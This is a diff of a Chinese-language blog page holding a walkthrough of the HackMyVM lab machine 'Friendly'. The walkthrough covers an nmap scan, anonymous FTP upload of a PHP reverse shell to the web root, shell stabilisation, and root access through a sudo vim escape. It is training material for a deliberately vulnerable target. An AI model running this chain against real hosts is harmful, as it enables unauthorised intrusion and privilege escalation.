@@ -7,18 +7,16 @@
     <link href='https://mirrors.sustech.edu.cn/cdnjs/ajax/libs/Primer/21.0.7/primer.css' rel='stylesheet' />
     <script src='https://7r1UMPH.github.io/plugins/theme.js'></script>
     <link rel="icon" href="https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250320200557660.ico">
-<meta name="description" content="# hmv_friendly
+<meta name="description" content="# 0.简介
 
-# 0.简介
-
-**靶机**：https://hackmyvm.eu/machines/machine.php?vm=Friendly  
-**难度**：绿色  
-**目标 IP**：192.168.205.129  
-**本机 IP**：192.168.205.128
+靶机：https://hackmyvm.eu/machines/machine.php?vm=Friendly
+ 难度：绿色
+ 目标 IP：192.168.205.129
+ 本机 IP：192.168.205.128
 
 # 1.扫描
 
-​`nmap`​起手
+nmap起手
 
 ```
 ┌──(kali㉿kali)-[~/test]
@@ -32,7 +30,6 @@ PORT   STATE SERVICE
 80/tcp open  http
 
 Nmap done: 1 IP address (1 host up) scanned in 1.10 seconds
-
 ```
 
 # 2.踩点
@@ -56,7 +53,6 @@ ftp> ls -la
 drwxrwxrwx   2 root     root         4096 Mar 11  2023 .
 drwxrwxrwx   2 root     root         4096 Mar 11  2023 ..
 -rw-r--r--   1 root     root        10725 Feb 23  2023 index.html
-
 ```
 
 和我们发现的网页目录架构一样，我们可以尝试上传一个反弹shell上去访问
@@ -75,7 +71,6 @@ ftp> ls
 -rw-r--r--   1 root     root        10725 Feb 23  2023 index.html
 -rw-r--r--   1 ftp      nogroup      2596 Feb  3 04:32 php.php
 226 Transfer complete
-
 ```
 
 访问
@@ -91,12 +86,11 @@ USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 bash: cannot set terminal process group (439): Inappropriate ioctl for device
 bash: no job control in this shell
-
 ```
 
 # 3. 获得稳定的 Shell
 
-获取**反向 shell** 后，通过以下命令获得稳定的**交互式** **TTY shell**：
+获取反向 shell 后，通过以下命令获得稳定的交互式 TTY shell：
 
 ```bash
 script /dev/null -c bash  
@@ -148,10 +142,9 @@ Matching Defaults entries for www-data on friendly:
 
 User www-data may run the following commands on friendly:
     (ALL : ALL) NOPASSWD: /usr/bin/vim
-
 ```
 
-![image](assets/image-20250203123641-1hov8b3.png)
+![image-20250331191435274](https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250331191435317.png)
 
 🔗https://gtfobins.github.io/gtfobins/vim/#sudo
 
@@ -160,21 +153,20 @@ www-data@friendly:/$ sudo vim -c ':!/bin/sh'
 
 # id
 uid=0(root) gid=0(root) groups=0(root)
+```
 
-```。">
+<!-- ##{'timestamp':1738580133}## -->。">
 <meta property="og:title" content="hmv_friendly">
-<meta property="og:description" content="# hmv_friendly
+<meta property="og:description" content="# 0.简介
 
-# 0.简介
-
-**靶机**：https://hackmyvm.eu/machines/machine.php?vm=Friendly  
-**难度**：绿色  
-**目标 IP**：192.168.205.129  
-**本机 IP**：192.168.205.128
+靶机：https://hackmyvm.eu/machines/machine.php?vm=Friendly
+ 难度：绿色
+ 目标 IP：192.168.205.129
+ 本机 IP：192.168.205.128
 
 # 1.扫描
 
-​`nmap`​起手
+nmap起手
 
 ```
 ┌──(kali㉿kali)-[~/test]
@@ -188,7 +180,6 @@ PORT   STATE SERVICE
 80/tcp open  http
 
 Nmap done: 1 IP address (1 host up) scanned in 1.10 seconds
-
 ```
 
 # 2.踩点
@@ -212,7 +203,6 @@ ftp> ls -la
 drwxrwxrwx   2 root     root         4096 Mar 11  2023 .
 drwxrwxrwx   2 root     root         4096 Mar 11  2023 ..
 -rw-r--r--   1 root     root        10725 Feb 23  2023 index.html
-
 ```
 
 和我们发现的网页目录架构一样，我们可以尝试上传一个反弹shell上去访问
@@ -231,7 +221,6 @@ ftp> ls
 -rw-r--r--   1 root     root        10725 Feb 23  2023 index.html
 -rw-r--r--   1 ftp      nogroup      2596 Feb  3 04:32 php.php
 226 Transfer complete
-
 ```
 
 访问
@@ -247,12 +236,11 @@ USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 bash: cannot set terminal process group (439): Inappropriate ioctl for device
 bash: no job control in this shell
-
 ```
 
 # 3. 获得稳定的 Shell
 
-获取**反向 shell** 后，通过以下命令获得稳定的**交互式** **TTY shell**：
+获取反向 shell 后，通过以下命令获得稳定的交互式 TTY shell：
 
 ```bash
 script /dev/null -c bash  
@@ -304,10 +292,9 @@ Matching Defaults entries for www-data on friendly:
 
 User www-data may run the following commands on friendly:
     (ALL : ALL) NOPASSWD: /usr/bin/vim
-
 ```
 
-![image](assets/image-20250203123641-1hov8b3.png)
+![image-20250331191435274](https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250331191435317.png)
 
 🔗https://gtfobins.github.io/gtfobins/vim/#sudo
 
@@ -316,8 +303,9 @@ www-data@friendly:/$ sudo vim -c ':!/bin/sh'
 
 # id
 uid=0(root) gid=0(root) groups=0(root)
+```
 
-```。">
+<!-- ##{'timestamp':1738580133}## -->。">
 <meta property="og:type" content="article">
 <meta property="og:url" content="https://7r1UMPH.github.io/post/hmv_friendly.html">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250320200605137.png">
@@ -388,14 +376,13 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
 </div>
 </div>
     <div id="content">
-<div class="markdown-body" id="postBody"><h1>hmv_friendly</h1>
-<h1>0.简介</h1>
-<p><strong>靶机</strong>：<a href="https://hackmyvm.eu/machines/machine.php?vm=Friendly" rel="nofollow">https://hackmyvm.eu/machines/machine.php?vm=Friendly</a><br>
-<strong>难度</strong>：绿色<br>
-<strong>目标 IP</strong>：192.168.205.129<br>
-<strong>本机 IP</strong>：192.168.205.128</p>
+<div class="markdown-body" id="postBody"><h1>0.简介</h1>
+<p>靶机：<a href="https://hackmyvm.eu/machines/machine.php?vm=Friendly" rel="nofollow">https://hackmyvm.eu/machines/machine.php?vm=Friendly</a><br>
+难度：绿色<br>
+目标 IP：192.168.205.129<br>
+本机 IP：192.168.205.128</p>
 <h1>1.扫描</h1>
-<p>​<code class="notranslate">nmap</code>​起手</p>
+<p>nmap起手</p>
 <pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
 └─$ nmap -sT -Pn -n -p- --min-rate 10000 192.168.205.129  
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-03 12:26 CST
@@ -407,7 +394,6 @@ PORT   STATE SERVICE
 80/tcp open  http
 
 Nmap done: 1 IP address (1 host up) scanned in 1.10 seconds
-
 </code></pre>
 <h1>2.踩点</h1>
 <p>先进行ftp匿名登录</p>
@@ -427,7 +413,6 @@ ftp&gt; ls -la
 drwxrwxrwx   2 root     root         4096 Mar 11  2023 .
 drwxrwxrwx   2 root     root         4096 Mar 11  2023 ..
 -rw-r--r--   1 root     root        10725 Feb 23  2023 index.html
-
 </code></pre>
 <p>和我们发现的网页目录架构一样，我们可以尝试上传一个反弹shell上去访问</p>
 <pre class="notranslate"><code class="notranslate">ftp&gt; put php.php 
@@ -443,7 +428,6 @@ ftp&gt; ls
 -rw-r--r--   1 root     root        10725 Feb 23  2023 index.html
 -rw-r--r--   1 ftp      nogroup      2596 Feb  3 04:32 php.php
 226 Transfer complete
-
 </code></pre>
 <p>访问</p>
 <pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
@@ -456,10 +440,9 @@ USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 bash: cannot set terminal process group (439): Inappropriate ioctl for device
 bash: no job control in this shell
-
 </code></pre>
 <h1>3. 获得稳定的 Shell</h1>
-<p>获取<strong>反向 shell</strong> 后，通过以下命令获得稳定的<strong>交互式</strong> <strong>TTY shell</strong>：</p>
+<p>获取反向 shell 后，通过以下命令获得稳定的交互式 TTY shell：</p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">script /dev/null -c bash  
 ctrl+z  
 stty raw -echo<span class="pl-k">;</span> <span class="pl-c1">fg</span>  
@@ -505,16 +488,15 @@ Matching Defaults entries for www-data on friendly:
 
 User www-data may run the following commands on friendly:
     (ALL : ALL) NOPASSWD: /usr/bin/vim
-
 </code></pre>
-<p><a target="_blank" rel="noopener noreferrer" href="assets/image-20250203123641-1hov8b3.png"><img src="assets/image-20250203123641-1hov8b3.png" alt="image" style="max-width: 100%;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/3846f807646b961fd5ecb9ea94b25167268f50ab2c718152d0e64b05f12dc206/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f377231554d50482f377231554d50482e6769746875622e696f406d61696e2f7374617469632f696d6167652f32303235303333313139313433353331372e706e67"><img src="https://camo.githubusercontent.com/3846f807646b961fd5ecb9ea94b25167268f50ab2c718152d0e64b05f12dc206/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f377231554d50482f377231554d50482e6769746875622e696f406d61696e2f7374617469632f696d6167652f32303235303333313139313433353331372e706e67" alt="image-20250331191435274" data-canonical-src="https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250331191435317.png" style="max-width: 100%;"></a></p>
 <p>🔗<a href="https://gtfobins.github.io/gtfobins/vim/#sudo" rel="nofollow">https://gtfobins.github.io/gtfobins/vim/#sudo</a></p>
 <pre class="notranslate"><code class="notranslate">www-data@friendly:/$ sudo vim -c ':!/bin/sh'
 
 # id
 uid=0(root) gid=0(root) groups=0(root)
-
-</code></pre></div>
+</code></pre>
+</div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
 <button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
